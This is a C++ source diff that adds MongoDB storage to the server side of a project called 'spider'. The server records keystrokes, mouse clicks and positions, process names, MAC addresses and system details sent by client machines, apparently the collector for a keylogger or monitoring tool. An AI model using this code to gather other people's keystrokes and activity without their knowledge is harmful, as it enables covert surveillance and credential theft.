@@ -32,8 +32,11 @@ namespace spider
 	}
       return (*this);
     }
-
+#if defined MONGOCXX
+    Storage::Storage() : m_storage{}, m_logFile(), m_mongoInstance{}, m_mongoClient{mongocxx::uri{}}, m_mongoDb(m_mongoClient["spider"])
+#else
     Storage::Storage() : m_storage{}, m_logFile()
+#endif
     {
       m_logFile.open("event.log", std::ios_base::app);
       m_logFile << "===Logging started===\n";
@@ -244,6 +247,12 @@ namespace spider
 	{
 	  EventStorage const &store = m_storage.front();
 
+          // creating document for DB
+#if defined MONGOCXX
+          auto builder = bsoncxx::builder::stream::document{};
+          //mongocxx::collection coll = db["getinfo"];
+          mongocxx::collection coll;
+#endif
 	  std::string msg;
 	  {
 	    std::array<char, 64 * 8> tmp;
@@ -254,6 +263,10 @@ namespace spider
 	        store.header.macAddress[4], store.header.macAddress[5]);
 	    msg = tmp.data();
 	  }
+#if defined MONGOCXX
+          bsoncxx::document::value doc_value = builder
+            << "macaddr" << msg << bsoncxx::builder::stream::finalize;
+#endif
 
 	  {
 
@@ -271,6 +284,13 @@ namespace spider
 	    msg += " - " +
 	           timeToString(static_cast<std::time_t>(store.header.time)) +
 	           " - " + type + " - ";
+#if defined MONGOCXX
+            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
+              << "date" << timeToString(static_cast<std::time_t>(store.header.time))
+              << "command" << type << bsoncxx::builder::stream::finalize;
+            coll = m_mongoDb[type];
+#endif
+
 	  }
 
 	  switch (store.header.type)
@@ -298,6 +318,13 @@ namespace spider
 		       reinterpret_cast<char const *>(
 		           store.ev.processName.data()) +
 		       "]";
+#if defined MONGOCXX
+            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
+                  << "key" <<  key
+                  << "state" << stateMap.at(store.ev.state)
+                  << "processName" << reinterpret_cast<char const *>(store.ev.processName.data())
+                  << bsoncxx::builder::stream::finalize;
+#endif
 	      }
 	      break;
 	    case network::tcp::PacketType::MouseButton:
@@ -319,6 +346,13 @@ namespace spider
 		       reinterpret_cast<char const *>(
 		           store.ev.processName.data()) +
 		       "]";
+#if defined MONGOCXX
+            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
+                  << "mouseKey" << mouseKey
+                  << "state" << stateMap.at(store.ev.state)
+                  << "processName" << reinterpret_cast<char const *>(store.ev.processName.data())
+                  << bsoncxx::builder::stream::finalize;
+#endif
 	      }
 	      break;
 	    case network::tcp::PacketType::MousePosition:
@@ -327,6 +361,13 @@ namespace spider
 	             reinterpret_cast<char const *>(
 	                 store.mov.processName.data()) +
 	             "]";
+#if defined MONGOCXX
+            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
+                << "posX" << std::to_string(store.mov.posX)
+                << "posY" << std::to_string(store.mov.posY)
+                << "processName" << reinterpret_cast<char const *>(store.mov.processName.data())
+                << bsoncxx::builder::stream::finalize;
+#endif
 	      break;
 	    case network::tcp::PacketType::Screenshot:
 	      break;
@@ -347,14 +388,43 @@ namespace spider
 		    " - " + std::to_string(store.infos.pageSize) + " Kb - " +
 		    std::to_string(store.infos.nbProc) + " CPUs - " +
 		    std::to_string(store.infos.ram) + " Mb";
+#if defined MONGOCXX
+            doc_value = builder << bsoncxx::builder::stream::concatenate(doc_value.view())
+                  << "archi_proc" << procArchitectureMap.at(
+		        static_cast<spider::client::library::ProcArchitecture>
+                        (store.infos.procArch))
+                  << "archi_os" << architectureMap.at(
+		        static_cast<spider::client::library::Architecture>(
+		            store.infos.arch))
+                  << "os" << osMap.at(
+		        static_cast<spider::client::library::OperatingSystem>(
+		            store.infos.os))
+                  << "cahe_size" << std::to_string(store.infos.pageSize) + " Kb"
+                  << "cpu" << std::to_string(store.infos.nbProc) + " CPUs"
+                  << "ram" << std::to_string(store.infos.ram) + " Mb"
+                  << bsoncxx::builder::stream::finalize;
+#endif
 	      }
 	      break;
 	    }
 
-	  nope::log::Log(Info) << msg;
-	  m_logFile << msg << '\n';
-	  m_storage.pop();
-	}
+          //push document to mongoDB
+#if defined MONGOCXX
+          bsoncxx::document::view view = doc_value.view();
+          try
+          {
+            bsoncxx::stdx::optional<mongocxx::result::insert_one> result =
+              coll.insert_one(view);
+          } catch (...)
+          {
+            nope::log::Log(Info) << "Cannot connect to mongoDB.";
+          }
+#else
+          m_logFile << msg << '\n';
+#endif
+          nope::log::Log(Info) << msg;
+          m_storage.pop();
+        }
     }
 
     std::string Storage::timeToString(std::time_t const rawtime) const
@@ -364,9 +434,9 @@ namespace spider
 
       dt = std::localtime(&rawtime);
       if (dt)
-	{
-	  std::strftime(buffer.data(), sizeof(buffer), "%c", dt);
-	}
+      {
+        std::strftime(buffer.data(), sizeof(buffer), "%c", dt);
+      }
       return std::string(buffer.data());
     }
   }
